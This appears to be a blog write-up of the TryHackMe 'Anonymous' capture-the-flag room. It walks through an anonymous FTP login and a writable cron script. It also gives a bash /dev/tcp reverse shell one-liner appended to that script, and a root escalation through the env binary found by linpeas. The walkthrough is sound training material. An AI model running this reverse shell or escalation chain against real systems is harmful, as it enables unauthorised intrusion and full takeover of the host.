---
layout: post
title: THM Anonymous Write-up
excerpt_separator: <!--more-->
---
<img src="/img/anon-img/0.header-image.png">
https://tryhackme.com/room/anonymous
<!--more-->
<p><b>Question 1. Enumerate the machine. How many ports are open?</b></p>
<p><b>Question 2. What service is running on port 21?</b></p>
<p><b>Question 3. What service is running on ports 139 and 445?</b></p>
<p>Let’s start off by  running a basic nmap scan for the top 1000 ports</p>
<p>We have ports 21,22,139 and 445 open. Let enumerate these further. </p>
<img src="/img/anon-img/1.basic_nmap_scan.png">
<p> Now let's check all 65k ports by using the -p- flag just to make sure there aren't anymore open ports. This will take a few minutes. While this is working let’s check out the FTP service on port 21.   
</p>
<img src="/img/anon-img/3.nmap_scan_all_ports.png">
<p>We’re able to login to the FTP service with anonymous:anonymous 
Let’s enumerate the file system.  </p>
<img src="/img/anon-img/4.Ftp_anon_login.png">
<p> There’s a dir named “scripts”  </p>
<img src="/img/anon-img/5.FTP_scrips_dir.png">
<p>There’s four files here. Let’s download these using the get command.  </p>
<img src="/img/anon-img/6.get_ftp_files.png">
<p>We’ll need to review these scripts, but first let’s check on our nmap scan.
Looks like these are the only open ports. Now you can answer question 1,2 and 3.  </p>
<img src="/img/anon-img/7.nmap_all_ports_scan_results..png">
<p><b>Questions 4. There's a share on the user's computer.  What's it called?</b></p>
<p>Let’s look at the to_do.txt file we download. Nothing helpful here.Let’s look at the other files. </p>
<img src="/img/anon-img/8.to_do.txt_output.png">
<p> Wow! There’s a bash script that’s probably running on a cron job, the only issue is we don’t know how often it runs. If we’re lucky it runs every few minutes. The good news is we have write  permissions, so It's definitely worth attempting  to gain a shell from it.  </p>
<img src="/img/anon-img/9.clean.sh_output.png">
<p>Let’s make a directory on our local machine name ftp and  mount the FTP  directory  using curlftpfs </p>
<img src="/img/anon-img/10.mkdir-ftp-and-mount.png">
<p>Cd into the FTP directory and open the clean.sh file in a text editor.  </p>
<img src="/img/anon-img/11.cd-gedit-file.png">
<img src="/img/anon-img/12.clean.sh-before-edit.png">
<p>Let’s add this bash shell command (bash -i >& /dev/tcp/your_ip_here/9001 0>&1) to the end of the script like below.  Don’t save  it yet we need to set up a listener to catch this shell on our local machine first.  </p>
<img src="/img/anon-img/13.shell-command-added-to-script.png">
<p>Set up a netcat listener on our local machine. </p>
<img src="/img/anon-img/14.setup-nc-listener.png">
<p>  Now save this file. </p>
<img src="/img/anon-img/13.shell-command-added-to-script.png">
<p>And we have a reverse shell. Let’s see if we can find the answer to question 4. </p>
<img src="/img/anon-img/15.rev-shell.png">
<p>Here we have the user.txt file and the directory of the FTP share we mounted. Let’s cat the user.txt  file, answer question 4 and 5. </p>
<img src="/img/anon-img/16.-user.txt.png">
<p>Now let’s start enumerating and try to gain a root shell. 
We can’t write to the passwd or shadow file, but it appears that we’re the only other useful user beside root so no lateral I don’t think we’ll need a lateral movement. Keep enumerating.  </p>
<img src="/img/anon-img/17.passwd-shadow-files.png">
<p>Nothing's standing out. Let’s try running linpeas. On your local host setup a python simple http server to host the linepeas  file.  </p>
<img src="/img/anon-img/18.pythong-simple-server.png">
<p>Back in your shell, if you're not already, navigate to your home folder and issue a wget command to download the linepease file. </p>
<img src="/img/anon-img/19.download-linpease.png">
<p>Make the file  executable  and run it like this ./linpease.sh </p>
<img src="/img/anon-img/20.linpease-running.png">
<p>This is interesting, let's check GTFObins. https://gtfobins.github.io/gtfobins/env/  </p>
<img src="/img/anon-img/21. linpease-env-binary.png">
<img src="/img/anon-img/22.GTFObins-on-the-env-binary.png">
<p> When we execute the env binary we can call /bin/sh but have to add -p to maintain permissions - in this case root and voila, we have root </p>
<img src="/img/anon-img/23.root-shell.png">
<p>Let's grab the root flag. </p>
<img src="/img/anon-img/24.root.txt.png">




